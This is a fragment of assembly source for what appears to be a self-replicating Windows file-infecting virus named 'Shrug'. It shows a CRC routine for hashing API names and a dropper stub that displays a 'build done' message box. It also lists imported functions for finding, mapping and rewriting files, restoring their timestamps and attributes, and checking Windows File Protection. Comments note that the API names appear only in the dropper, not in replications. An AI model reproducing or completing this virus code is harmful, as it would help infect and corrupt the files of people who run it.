        xor     eax, 4c11db7h                   ;use generator polymonial (see IEEE 802)

create_skip:
        loop    create_inner
        sub     cl, byte [ebx]                  ;carry set if not zero
        inc     ebx                             ;carry not altered by inc
        jb      create_outer
        stosd
        dec     edx
        jne     create_crcs
        ret
;create_crcs     endp

do_message:
        xor     r9d, r9d
        mov     r8d, txttitle
        mov     edx, txtbody
        xor     ecx, ecx
        call    MessageBoxA
        xor     ecx, ecx
        call    ExitProcess

;must be alphabetical order
;API names are not present in replications, only in dropper

ntdnames:       db      "LdrGetDllHandle"                  , 0
                db      "RtlAddVectoredExceptionHandler"   , 0
                db      "RtlRemoveVectoredExceptionHandler", 0

krnnames:       db      "CloseHandle"         , 0
                db      "CreateFileMappingA"  , 0
                db      "CreateFileW"         , 0
                db      "FindClose"           , 0
                db      "FindFirstFileW"      , 0
                db      "FindNextFileW"       , 0
                db      "GetFullPathNameW"    , 0
                db      "GetTickCount"        , 0
                db      "GlobalAlloc"         , 0
                db      "GlobalFree"          , 0
                db      "LoadLibraryA"        , 0
                db      "MapViewOfFile"       , 0
                db      "SetCurrentDirectoryA", 0
                db      "SetCurrentDirectoryW", 0
                db      "SetFileAttributesW"  , 0
                db      "SetFileTime"         , 0
                db      "UnmapViewOfFile"     , 0

sfcnames:       db      "SfcIsFileProtected", 0

ntdll:          db      "ntdll", 0

txttitle:       db      "Shrug", 0
txtbody:        db      "build done", 0
